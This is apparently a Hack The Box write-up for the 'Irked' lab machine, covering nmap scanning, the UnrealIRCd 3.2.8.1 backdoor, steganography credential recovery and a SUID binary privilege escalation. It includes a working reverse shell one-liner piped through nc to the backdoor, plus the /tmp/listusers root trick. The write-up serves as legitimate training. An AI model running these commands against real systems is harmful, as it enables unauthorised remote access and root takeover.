# Irked-----HTB

First out nmap reports:

└─$ nmap -p- --min-rate 5000 -T4 irked.htb
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-10 10:35 -0300
Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 9.73% done; ETC: 10:35 (0:00:19 remaining)
Warning: 10.129.3.165 giving up on port because retransmission cap hit (6).
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 25.38% done; ETC: 10:35 (0:00:18 remaining)
Stats: 0:00:13 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 53.24% done; ETC: 10:35 (0:00:11 remaining)
Stats: 0:00:17 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 68.64% done; ETC: 10:35 (0:00:08 remaining)
Stats: 0:00:20 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 81.61% done; ETC: 10:35 (0:00:05 remaining)
Stats: 0:00:23 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 93.47% done; ETC: 10:35 (0:00:02 remaining)
Stats: 0:00:26 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 99.99% done; ETC: 10:35 (0:00:00 remaining)
Stats: 0:00:27 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 99.99% done; ETC: 10:35 (0:00:00 remaining)
Nmap scan report for irked.htb (10.129.3.165)
Host is up (0.17s latency).
Not shown: 64945 closed tcp ports (reset), 583 filtered tcp ports (no-response)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
6697/tcp  open  ircs-u
8067/tcp  open  infi-async
51599/tcp open  unknown
65534/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 29.97 seconds



└─$ sudo nmap -A -p22,80,111,6697,8067,51599,65534 irked.htb
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-10 10:36 -0300
Stats: 0:00:12 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 85.71% done; ETC: 10:36 (0:00:02 remaining)
Nmap scan report for irked.htb (10.129.3.165)
Host is up (0.16s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
|_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          37817/udp   status
|   100024  1          41108/tcp6  status
|   100024  1          51599/tcp   status
|_  100024  1          54494/udp6  status
6697/tcp  open  irc     UnrealIRCd
8067/tcp  open  irc     UnrealIRCd
51599/tcp open  status  1 (RPC #100024)
65534/tcp open  irc     UnrealIRCd
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   156.33 ms 10.10.14.1
2   156.68 ms irked.htb (10.129.3.165)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.17 seconds


The website at 80 is only this image for now:
<img width="1458" height="804" alt="image" src="https://github.com/user-attachments/assets/20888f72-dadf-4b3f-9286-0eb125ea1d29" />

What comes to us as surface for exploring is this:
6697/tcp  open  irc     UnrealIRCd
8067/tcp  open  irc     UnrealIRCd
51599/tcp open  status  1 (RPC #100024)
65534/tcp open  irc     UnrealIRCd

They are using UnrealIRCd. My initial mistake was paying too much attention to the RPC protocol, instead of checking the other protocols that came up at the nmap report.

So let's try to get some info about this UnrealIRCd. There are many clients for it, i'll be using irssi, with the comand below:
irssi -c irked.htb -p 6697
Only to find they are using version 3.2.8.1
<img width="662" height="39" alt="image" src="https://github.com/user-attachments/assets/7fee1998-71be-4d4a-8033-b5bde2db9b66" />

Google UnrealIRCd v3.2.8.1 and find that there is a very famous backdoor for this version of the software. 

The exploit works like so: Issue a command but start with AB
AB; whois for example.

Let's try something other than that:
echo 'AB; sh -i >& /dev/tcp/10.10.12.181/4444 0>&1' | nc 10.10.10.117 65534

set up a net cat listener and issue the command to get the webshell:
<img width="980" height="108" alt="image" src="https://github.com/user-attachments/assets/4212a2e6-d63c-412c-9ec7-7080f1b4f650" />

/etc/passwd shows us the real user djmardov:
<img width="545" height="59" alt="image" src="https://github.com/user-attachments/assets/4c4c3c8b-8d60-4586-a0bb-9d7707560cb1" />

Enumeration on his /home/Documents folder shows this to us:
<img width="864" height="200" alt="image" src="https://github.com/user-attachments/assets/eb6a374f-f18b-4d78-a433-6385fb0b04a8" />

"Super elite steg backup pw" Hints at a image that contains secrets inside it hidden using steganography "UPupDOWNdownLRlrBAbaSSss" seems to be the password.

DO you remember the picture at the website, let's try it:
first we curl the website to know the name of the image:
<img width="750" height="112" alt="image" src="https://github.com/user-attachments/assets/2c0b009e-e1ac-4ca7-92de-e3c94e7569e1" />

Then user curl to download the image:
<img width="1174" height="168" alt="image" src="https://github.com/user-attachments/assets/84732e91-b163-4a21-b92e-10979a67f227" />


then we use steghide and the password to extract the credential from the image:
<img width="773" height="184" alt="image" src="https://github.com/user-attachments/assets/ca739788-1a63-4c5f-b9c1-cddfc136bd9b" />

ssh into djmardov:
<img width="1138" height="249" alt="image" src="https://github.com/user-attachments/assets/bb5d9ab0-96ee-4360-b3f7-1343e8cf1cbb" />

PRIVESC
Very easy use the command to find processesses that run with SUID:
djmardov@irked:~$ find / -user root -perm -4000 -exec ls -ldb {} \; > /tmp/ckprm
Then cat the resulting file:
<img width="1064" height="370" alt="image" src="https://github.com/user-attachments/assets/37721509-c479-4dab-9908-706f2ca5e13b" />

The non default option is viewuser, execute it to see that he takes a file /tmp/listusers:
<img width="652" height="103" alt="image" src="https://github.com/user-attachments/assets/783b0855-0e55-4326-9031-a9fb93c4c9e0" />

Just simply construct a file named /tmp/listusers with echo or nano:
echo "sh" > /tmp/listusers, execute it and get root:
<img width="691" height="189" alt="image" src="https://github.com/user-attachments/assets/c2994435-4813-40a2-b28c-06807f9cb019" />











